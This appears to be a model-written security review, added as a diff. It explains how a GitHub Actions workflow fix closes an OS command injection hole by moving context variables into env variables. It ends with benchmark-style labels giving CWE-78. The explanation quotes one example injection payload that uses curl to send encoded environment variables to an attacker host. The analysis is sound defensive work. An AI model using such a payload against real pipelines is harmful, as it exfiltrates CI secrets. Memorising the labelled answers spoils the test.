@@ -1,0 +1,19 @@
+The changes in `file_01` and `file_02` both address a common security vulnerability in GitHub Actions workflows: **Command Injection**.
+
+In both files, the "before" code was directly interpolating GitHub Action context variables (like `${{ matrix.component }}`, `${{ github.event.inputs.redeploy_tag }}`, and `${{ steps.plugin_info.outputs.version }}`) directly into the `run` shell scripts. 
+
+For example, in `file_01`:
+`for key in $(echo '${{ toJSON(steps.release.outputs) }}' | jq -r 'keys[]'); do`
+If a malicious actor could control the content of `steps.release.outputs` (e.g., via a PR title or a modified output from a previous step), they could inject arbitrary shell commands by including a closing quote and a semicolon (e.g., `'; curl http://attacker.com/$(env | base64); '`).
+
+The "after" code fixes this by:
+1. Assigning the context variables to environment variables in the `env` block of the step.
+2. Referencing those environment variables (e.g., `$RELEASE_OUTPUTS`, `$MATRIX_COMPONENT`) within the `run` script.
+
+GitHub Actions evaluates the `env` block and sets the environment variables safely. When the shell script executes, it uses these variables, preventing the shell from interpreting their contents as part of the command structure, thus neutralizing the injection vector.
+
+This is a textbook fix for CWE-78 (OS Command Injection) specifically within the context of CI/CD pipelines.
+
+VULNERABILITY_FOUND: yes
+CWE_ID: CWE-78
+CWE_NAME: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')
